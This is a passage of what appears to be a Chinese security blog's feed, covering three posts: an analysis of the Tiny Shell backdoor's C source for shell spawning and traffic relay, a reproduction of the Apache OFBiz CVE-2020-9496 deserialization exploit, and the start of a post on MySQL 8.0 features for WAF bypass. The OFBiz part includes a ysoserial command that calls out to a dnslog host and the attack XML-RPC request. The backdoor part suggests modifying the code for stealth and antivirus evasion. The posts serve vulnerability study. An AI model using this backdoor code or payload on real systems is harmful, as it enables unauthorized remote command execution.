class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> RUNSHELL:</span><br><span class="line"></span><br><span class="line">        ret = tshd_runshell( client );</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        </span><br><span class="line">        ret = <span class="number">12</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">shutdown( client, <span class="number">2</span> );</span><br><span class="line"><span class="keyword">return</span>( ret );</span><br></pre></td></tr></table></figure><p>而在后面调用tshd_runshell()函数中，其中会再次fork子进程4来专门进行新建会话来反弹shell，而子进程4的父进程即子进程3则进行信息的接受和发送：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">/* fork to spawn a shell */</span></span><br><span class="line"></span><br><span class="line">    pid = fork();</span><br><span class="line">    <span class="keyword">if</span>( pid &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>( <span class="number">43</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( pid == <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* close the client socket and the pty (master side) */</span></span><br><span class="line">        close( client );</span><br><span class="line">        close( pty );</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* create a new session */</span></span><br><span class="line">        <span class="keyword">if</span>( setsid() &lt; <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span>( <span class="number">44</span> );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* set controlling tty, to have job control */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined LINUX || defined FREEBSD || defined OPENBSD || defined OSF</span></span><br><span class="line">        <span class="keyword">if</span>( ioctl( tty, TIOCSCTTY, <span class="literal">NULL</span> ) &lt; <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span>( <span class="number">45</span> );</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined CYGWIN || defined SUNOS || defined IRIX || defined HPUX</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> fd;</span><br><span class="line">            fd = open( slave, O_RDWR );</span><br><span class="line">            <span class="keyword">if</span>( fd &lt; <span class="number">0</span> )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span>( <span class="number">46</span> );</span><br><span class="line">            &#125;</span><br><span class="line">            close( tty );</span><br><span class="line">            tty = fd;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* tty becomes stdin, stdout, stderr */</span></span><br><span class="line">        dup2( tty, <span class="number">0</span> );</span><br><span class="line">        dup2( tty, <span class="number">1</span> );</span><br><span class="line">        dup2( tty, <span class="number">2</span> );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>( tty &gt; <span class="number">2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            close( tty );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* fire up the shell */</span></span><br><span class="line">        shell = (<span class="keyword">char</span> *) <span class="built_in">malloc</span>( <span class="number">8</span> );</span><br><span class="line">        <span class="keyword">if</span>( shell == <span class="literal">NULL</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span>( <span class="number">47</span> );</span><br><span class="line">        &#125;</span><br><span class="line">        shell[<span class="number">0</span>] = <span class="string">'/'</span>; shell[<span class="number">4</span>] = <span class="string">'/'</span>;</span><br><span class="line">        shell[<span class="number">1</span>] = <span class="string">'b'</span>; shell[<span class="number">5</span>] = <span class="string">'s'</span>;</span><br><span class="line">        shell[<span class="number">2</span>] = <span class="string">'i'</span>; shell[<span class="number">6</span>] = <span class="string">'h'</span>;</span><br><span class="line">        shell[<span class="number">3</span>] = <span class="string">'n'</span>; shell[<span class="number">7</span>] = <span class="string">'\0'</span>;</span><br><span class="line">        execl( shell, shell + <span class="number">5</span>, <span class="string">"-c"</span>, temp, (<span class="keyword">char</span> *) <span class="number">0</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* d0h, this shouldn't happen */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span>( <span class="number">48</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* tty (slave side) not needed anymore */</span></span><br><span class="line">        close( tty );</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* let's forward the data back and forth */</span></span><br><span class="line">        <span class="keyword">while</span>( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            FD_ZERO( &amp;rd );</span><br><span class="line">            FD_SET( client, &amp;rd );</span><br><span class="line">            FD_SET( pty, &amp;rd );</span><br><span class="line">            n = ( pty &gt; client ) ? pty : client;</span><br><span class="line">            <span class="keyword">if</span>( select( n + <span class="number">1</span>, &amp;rd, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span> ) &lt; <span class="number">0</span> )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span>( <span class="number">49</span> );</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>( FD_ISSET( client, &amp;rd ) )</span><br><span class="line">            &#123;</span><br><span class="line">                ret = pel_recv_msg( client, message, &amp;len );</span><br><span class="line">                <span class="keyword">if</span>( ret != PEL_SUCCESS )</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">return</span>( <span class="number">50</span> );</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>( write( pty, message, len ) != len )</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">return</span>( <span class="number">51</span> );</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>( FD_ISSET( pty, &amp;rd ) )</span><br><span class="line">            &#123;</span><br><span class="line">                len = read( pty, message, BUFSIZE );</span><br><span class="line">                <span class="keyword">if</span>( len == <span class="number">0</span> ) <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">if</span>( len &lt; <span class="number">0</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">return</span>( <span class="number">52</span> );</span><br><span class="line">                &#125;</span><br><span class="line">                ret = pel_send_msg( client, message, len );</span><br><span class="line">                <span class="keyword">if</span>( ret != PEL_SUCCESS )</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">return</span>( <span class="number">53</span> );</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span>( <span class="number">54</span> );</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>小结下来，大致如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">father -&gt; X</span><br><span class="line">       -&gt; child1</span><br><span class="line">             |</span><br><span class="line">          ----</span><br><span class="line">          |</span><br><span class="line">init -&gt; child1 -&gt; # waitpid(child2)</span><br><span class="line">               -&gt; child2 -&gt; X</span><br><span class="line">                         -&gt; child3</span><br><span class="line">                              |</span><br><span class="line">          ---------------------</span><br><span class="line">          |</span><br><span class="line">init -&gt; child3 -&gt; # send &amp; receive message</span><br><span class="line">               -&gt; child4 # reverse shell</span><br></pre></td></tr></table></figure><p>当然，可以自行魔改实现更高的隐蔽性和更强的免杀。</p><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://cloud.tencent.com/developer/article/1047029" target="_blank" rel="noopener">短小精干的Unix类后门Tiny shell的使用与分析</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="工具" scheme="https://www.mi1k7ea.com/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="渗透测试" scheme="https://www.mi1k7ea.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="工具" scheme="https://www.mi1k7ea.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>浅析Ofbiz反序列化漏洞（CVE-2020-9496）</title>
    <link href="https://www.mi1k7ea.com/2021/09/21/%E6%B5%85%E6%9E%90Ofbiz%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-9496%EF%BC%89/"/>
    <id>https://www.mi1k7ea.com/2021/09/21/浅析Ofbiz反序列化漏洞（CVE-2020-9496）/</id>
    <published>2021-09-21T11:36:17.000Z</published>
    <updated>2021-10-11T13:10:04.207Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>学习学习。</p><h2 id="0x01-基础知识"><a href="#0x01-基础知识" class="headerlink" title="0x01 基础知识"></a>0x01 基础知识</h2><h3 id="Apache-Ofbiz简介"><a href="#Apache-Ofbiz简介" class="headerlink" title="Apache Ofbiz简介"></a>Apache Ofbiz简介</h3><p>OFBiz是一个非常著名的电子商务平台，是一个非常著名的开源项目，提供了创建基于最新J2EE/XML规范和技术标准，构建大中型企业级、跨平台、跨数据库、跨应用服务器的多层、分布式电子商务类WEB应用系统的框架。 OFBiz最主要的特点是OFBiz提供了一整套的开发基于Java的web应用程序的组件和工具。包括实体引擎, 服务引擎, 消息引擎, 工作流引擎, 规则引擎等。</p><p>OFBiz 已经正式成为 Apache 的顶级项目: Apache OFBiz。</p><h3 id="XML-RPC"><a href="#XML-RPC" class="headerlink" title="XML-RPC"></a>XML-RPC</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>XML-RPC是一个规范和一组实现，允许软件在不同的操作系统上运行，在不同的环境中运行以通过网络进行过程调用。</p><p>XML-RPC是使用 HTTP 作为传输和 XML 作为编码的远程过程调用。XML-RPC 被设计得尽可能简单，同时允许传输、处理和返回复杂的数据结构。</p><h4 id="XML-RPC请求与数据类型"><a href="#XML-RPC请求与数据类型" class="headerlink" title="XML-RPC请求与数据类型"></a>XML-RPC请求与数据类型</h4><ul><li>XML-RPC请求响应相关内容具体参考：<a href="http://xmlrpc.com/spec.md" target="_blank" rel="noopener">http://xmlrpc.com/spec.md</a></li><li>XML-RPC数据类型具体参考：<a href="https://ws.apache.org/xmlrpc/types.html" target="_blank" rel="noopener">https://ws.apache.org/xmlrpc/types.html</a></li></ul><p>这里只看和PoC中构造相关的内容。</p><p>XML-RPC请求示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /RPC2 HTTP/1.0</span><br><span class="line">User-Agent: Frontier/5.1.2 (WinNT)</span><br><span class="line">Host: betty.userland.com</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-length: 181</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;methodCall&gt;</span><br><span class="line">    &lt;methodName&gt;examples.getStateName&lt;/methodName&gt;</span><br><span class="line">    &lt;params&gt;</span><br><span class="line">        &lt;param&gt;</span><br><span class="line">        &lt;value&gt;&lt;i4&gt;41&lt;/i4&gt;&lt;/value&gt;</span><br><span class="line">        &lt;/param&gt;</span><br><span class="line">    &lt;/params&gt;</span><br><span class="line">&lt;/methodCall&gt;</span><br></pre></td></tr></table></figure><p>简单说明：</p><ul><li>XML-RPC请求的Content-Type为<code>text/xml</code>；</li><li>XML-RPC请求内容的根标签为<code>&lt;methodCall&gt;</code>，而该标签下必须有<code>&lt;methodName&gt;</code>子标签来指定调用的方法名；</li><li>如果过程调用有参数，<code>&lt;methodCall&gt;</code>必须包含一个<code>&lt;params&gt;</code>子标签，<code>&lt;params&gt;</code>子标签可以包含任意数量的<code>&lt;param&gt;</code>，每个都有一个<code>&lt;value&gt;</code>标签来指定参数值内容；</li><li>其中<code>&lt;value&gt;</code>标签中的参数值默认为string类型，可以指定<code>&lt;struct&gt;</code>类型子标签、其中包含<code>&lt;member&gt;</code>并且每个<code>&lt;member&gt;</code>包含一个<code>&lt;name&gt;</code>和一个<code>&lt;value&gt;</code>；</li></ul><p>如果XML-RPC服务端设置了enabledForExtensions，那么就支持附加的数据类型，其中包括<code>&lt;serializable&gt;</code>标签，其中的内容为一个对象被转换为序列化的表示形式并作为Base64编码的字节数组。</p><h2 id="0x02-漏洞原理"><a href="#0x02-漏洞原理" class="headerlink" title="0x02 漏洞原理"></a>0x02 漏洞原理</h2><p>在17.12.04之前版本的Ofbiz中，其中的未授权访问XMLRPC接口<code>/webtools/control/xmlrpc</code>存在反序列化漏洞，攻击者可通过该接口实现RCE。</p><h2 id="0x03-影响版本"><a href="#0x03-影响版本" class="headerlink" title="0x03 影响版本"></a>0x03 影响版本</h2><p>&lt; 17.12.04</p><h2 id="0x04-环境搭建"><a href="#0x04-环境搭建" class="headerlink" title="0x04 环境搭建"></a>0x04 环境搭建</h2><p>参考Vulhub：<a href="https://vulhub.org/#/environments/ofbiz/CVE-2020-9496/" target="_blank" rel="noopener">https://vulhub.org/#/environments/ofbiz/CVE-2020-9496/</a></p><h2 id="0x05-漏洞复现"><a href="#0x05-漏洞复现" class="headerlink" title="0x05 漏洞复现"></a>0x05 漏洞复现</h2><p>使用ysoserial生成payload：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 <span class="string">"ping -nc 1 ofbiz.xudce2.dnslog.cn"</span> | base64 | tr -d <span class="string">"\n"</span></span><br></pre></td></tr></table></figure><p>向<code>/webtools/control/xmlrpc</code>接口发送payload，base64-payload换为生成的payload内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">POST /webtools/control/xmlrpc HTTP/1.1</span><br><span class="line">Host: your-ip</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 4093</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;methodCall&gt;</span><br><span class="line">  &lt;methodName&gt;ProjectDiscovery&lt;/methodName&gt;</span><br><span class="line">  &lt;params&gt;</span><br><span class="line">    &lt;param&gt;</span><br><span class="line">      &lt;value&gt;</span><br><span class="line">        &lt;struct&gt;</span><br><span class="line">          &lt;member&gt;</span><br><span class="line">            &lt;name&gt;test&lt;/name&gt;</span><br><span class="line">            &lt;value&gt;</span><br><span class="line">              &lt;serializable xmlns=&quot;http://ws.apache.org/xmlrpc/namespaces/extensions&quot;&gt;[base64-payload]&lt;/serializable&gt;</span><br><span class="line">            &lt;/value&gt;</span><br><span class="line">          &lt;/member&gt;</span><br><span class="line">        &lt;/struct&gt;</span><br><span class="line">      &lt;/value&gt;</span><br><span class="line">    &lt;/param&gt;</span><br><span class="line">  &lt;/params&gt;</span><br><span class="line">&lt;/methodCall&gt;</span><br></pre></td></tr></table></figure><p>冲：</p><p><img src="/2021/09/21/浅析Ofbiz反序列化漏洞（CVE-2020-9496）/1.png" alt=""></p><p><img src="/2021/09/21/浅析Ofbiz反序列化漏洞（CVE-2020-9496）/2.png" alt=""></p><h2 id="0x06-漏洞分析"><a href="#0x06-漏洞分析" class="headerlink" title="0x06 漏洞分析"></a>0x06 漏洞分析</h2><p>根据漏洞接口<code>/webtools/control/xmlrpc</code>找到webtools应用目录。</p><p>先看到配置文件<code>framework/webtools/webapp/webtools/WEB-INF/web.xml</code>，其中设置了enabledForExtensions为true来使得XML-RPC支持<code>&lt;serializable&gt;</code>这种标签进行Java序列化数据的传输：</p><p><img src="/2021/09/21/浅析Ofbiz反序列化漏洞（CVE-2020-9496）/3.png" alt=""></p><p>而其中看到针对<code>/control/</code>接口的处理是由<code>org.apache.ofbiz.webapp.control.ControlServlet</code>来操作的：</p><p><img src="/2021/09/21/浅析Ofbiz反序列化漏洞（CVE-2020-9496）/4.png" alt=""></p><p>到ControlServlet类中，看到doPost()实际调用的就是doGet()、其中先调用getRequestHandler()函数来初始化<code>org\apache\ofbiz\webapp\control\RequestHandler</code>类，而RequestHandler类在初始化时会从<code>/WEB-INF/controller.xml</code>配置文件中获取控制器URL配置即请求URL映射表，然后设置对应的ViewFactory和EventFactory：</p><p><img src="/2021/09/21/浅析Ofbiz反序列化漏洞（CVE-2020-9496）/5.png" alt=""></p><p><img src="/2021/09/21/浅析Ofbiz反序列化漏洞（CVE-2020-9496）/6.png" alt=""></p><p><img src="/2021/09/21/浅析Ofbiz反序列化漏洞（CVE-2020-9496）/7.png" alt=""></p><p>到<code>/WEB-INF/controller.xml</code>中查看，对应xmlrpc URI的URL配置中，在<code>&lt;security&gt;</code>标签中并没有设置对应的<code>auth</code>选项、默认为<code>false</code>即不需要身份验证，这就导致了本次未授权RCE的存在：</p><p><img src="/2021/09/21/浅析Ofbiz反序列化漏洞（CVE-2020-9496）/8.png" alt=""></p><p>回到doGet()函数中，往下会调用刚刚新建的RequestHandler类对象的doRequest()函数进一步处理请求，其中会调用runEvent()函数来根据Event类型调用对应EventHandler的invoke()函数，这里实际调用就是前面初始化RequestHandler类对象时设置的XmlRpcEventHandler的invoke()函数、其中先调用getXmlRpcConfig()函数获取XmpRpc相关配置（开启enabledForExtensions）、然后再调用execute()函数作进一步处理：</p><p><img src="/2021/09/21/浅析Ofbiz反序列化漏洞（CVE-2020-9496）/9.png" alt=""></p><p><img src="/2021/09/21/浅析Ofbiz反序列化漏洞（CVE-2020-9496）/10.png" alt=""></p><p>跟进去，其中调用getRequest()函数来获取XmlRpcRequest类实例，在getRequest()函数中则是通过设置XmlRpcRequestParser作为ContentHandler，然后在解析前对XXE进行了防御：</p><p><img src="/2021/09/21/浅析Ofbiz反序列化漏洞（CVE-2020-9496）/11.png" alt=""></p><p><img src="/2021/09/21/浅析Ofbiz反序列化漏洞（CVE-2020-9496）/12.png" alt=""></p><p>往下，就是采用SAX的方式来解析XML内容的过程了，调用过程大致为：SAXParserImpl类parse()-&gt;XML11Configuration类parse()-&gt;XMLDocumentFragmentScannerImpl类scanDocument()-&gt;XMLDocumentScannerImpl#PrologDispatcher类dispatch()，在dispatch()中触发扫描XML内容。</p><p>其中具体的扫描解析过程这里不多说，直接看到后面是会调用之前设置的ContentHandler.startElement()即XmlRpcRequestParser.startElement()来开始扫描元素、其支持对methodCall、methodName、params、param、value等标签的解析，如果非上述标签则调用父类RecursiveTypeParserImpl.startElement()来进行解析、其中由于typeParser类型解析器为空会调用到getParser()函数来获取对应的解析器进行元素解析：</p><p><img src="/2021/09/21/浅析Ofbiz反序列化漏洞（CVE-2020-9496）/13.png" alt=""></p><p><img src="/2021/09/21/浅析Ofbiz反序列化漏洞（CVE-2020-9496）/14.png" alt=""></p><p>这里是调用的TypeFactoryImpl类的getParser()函数来根据标签类型获取对应的解析器。这里只关注看到本次漏洞关键的serializable标签的部分即可，在解析过程中识别到是serializable标签就会返回SerializableParser（当然，在getParser()函数中看到获取到SerializableParser前需要满足一个前提条件即xmlns必须为<code>http://ws.apache.org/xmlrpc/namespaces/extensions</code>，这就是为啥构造PoC的serializable标签要带上含有该属性值的原因）：</p><p><img src="/2021/09/21/浅析Ofbiz反序列化漏洞（CVE-2020-9496）/18.png" alt=""></p><p><img src="/2021/09/21/浅析Ofbiz反序列化漏洞（CVE-2020-9496）/15.png" alt=""></p><p>跟进SerializableParser中，由于解析获取完serializable标签的内容后，会调用该类的getResult()函数来获取解析结果，而该函数中会直接调用readObject()进行反序列化操作，从而导致反序列化漏洞的存在：</p><p><img src="/2021/09/21/浅析Ofbiz反序列化漏洞（CVE-2020-9496）/16.png" alt=""></p><p>至此，大致触发流程就分析完了。</p><h2 id="0x07-补丁分析"><a href="#0x07-补丁分析" class="headerlink" title="0x07 补丁分析"></a>0x07 补丁分析</h2><p>官方更新：<a href="https://github.com/apache/ofbiz-framework/commit/4bdfb54ffb6e05215dd826ca2902c3e31420287a#diff-bb54e344de72488b4e358a9d8fd385a5d9a6aea32d7236e7c268889f6ba3a8f6" target="_blank" rel="noopener">https://github.com/apache/ofbiz-framework/commit/4bdfb54ffb6e05215dd826ca2902c3e31420287a#diff-bb54e344de72488b4e358a9d8fd385a5d9a6aea32d7236e7c268889f6ba3a8f6</a></p><p>就是给该<code>/webtools/control/xmlrpc</code>接口添加了认证，杜绝了未授权RCE：</p><p><img src="/2021/09/21/浅析Ofbiz反序列化漏洞（CVE-2020-9496）/17.png" alt=""></p><h2 id="0x08-参考"><a href="#0x08-参考" class="headerlink" title="0x08 参考"></a>0x08 参考</h2><p><a href="https://xz.aliyun.com/t/8184" target="_blank" rel="noopener">Apache Ofbiz RCE (CVE-2020-9496) 漏洞分析</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="Ofbiz" scheme="https://www.mi1k7ea.com/tags/Ofbiz/"/>
    
  </entry>
  
  <entry>
    <title>浅析MySQL8.0新特性利用</title>
    <link href="https://www.mi1k7ea.com/2021/09/01/%E5%88%A9%E7%94%A8MySQL8-0%E6%96%B0%E7%89%B9%E6%80%A7%E7%BB%95%E8%BF%87WAF/"/>
    <id>https://www.mi1k7ea.com/2021/09/01/利用MySQL8-0新特性绕过WAF/</id>
    <published>2021-09-01T14:51:45.000Z</published>
    <updated>2021-10-12T16:06:04.357Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-MySQL-8-0环境搭建"><a href="#0x01-MySQL-8-0环境搭建" class="headerlink" title="0x01 MySQL 8.0环境搭建"></a>0x01 MySQL 8.0环境搭建</h2><p>在PHPstudy中支持的MySQL 8版本为8.0.12，但是实际利用到的新特性是在MySQL 8.0.19之后才出现的，因此需要自行搭建对应的MySQL环境。</p><p>这里就本地下载Windows最新版搭建，参考菜鸟教程进行Windows本地安装：<a href="https://www.runoob.com/mysql/mysql-install.html" target="_blank" rel="noopener">https://www.runoob.com/mysql/mysql-install.html</a></p><p>接着，在my.ini文件中添加如下内容：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">default_authentication_plugin</span>=mysql_native_password</span><br></pre></td></tr></table></figure><p>安装好运行登录之后需要修改密码：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">user</span> <span class="string">'root'</span>@<span class="string">'localhost'</span> <span class="keyword">identified</span> <span class="keyword">by</span> <span class="string">'root'</span>;</span><br><span class="line"><span class="keyword">FLUSH</span> <span class="keyword">PRIVILEGES</span>;</span><br></pre></td></tr></table></figure><p>最后重启MySQL服务即可：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net stop mysql</span><br><span class="line">net start mysql</span><br></pre></td></tr></table></figure><h2 id="0x02-MySQL-8-0新特性"><a href="#0x02-MySQL-8-0新特性" class="headerlink" title="0x02 MySQL 8.0新特性"></a>0x02 MySQL 8.0新特性</h2><h3 id="TABLE语句"><a href="#TABLE语句" class="headerlink" title="TABLE语句"></a>TABLE语句</h3><h4 id="用法简介"><a href="#用法简介" class="headerlink" title="用法简介"></a>用法简介</h4><p>官方文档：<a href="https://dev.mysql.com/doc/refman/8.0/en/table.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/8.0/en/table.html</a></p><p>TABLE是MySQL 8.0.19中引入的DML语句，它返回命名表的行和列。</p><p>用法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]]</span><br></pre></td></tr></table></figure><h4 id="TABLE与SELECT"><a href="#TABLE与SELECT" class="headerlink" title="TABLE与SELECT"></a>TABLE与SELECT</h4><p>TABLE语句在某些方面的行为类似于SELECT。给定存在一个名为的表t，以下两个语句将产生相同的输出：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TABLE t;</span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> t;</span><br></pre></td></tr></table></figure><p>比如：</p><p><img src="/2021/09/01/利用MySQL8-0新特性绕过WAF/1.png" alt=""></p><p>TABLE和SELECT关键区别：</p><ul><li><p>TABLE始终显示表的所有列；</p></li><li><p>TABLE不允许对行进行任意过滤，也就是说，TABLE不支持任何WHERE子句；</p></li></ul><p>可以通过ORDER BY和LIMIT这两各关键字实现限制返回的表列来获取指定的行。</p><h4 id="UNION联合查询替换"><a href="#UNION联合查询替换" class="headerlink" title="UNION联合查询替换"></a>UNION联合查询替换</h4><p>TABLE可以替换UNION SELECT结构，也可以和SELECT交叉使用，注意两个table的列数必须相同：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">table security.users union table security.referers;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> security.users <span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> security.referers;</span><br><span class="line"><span 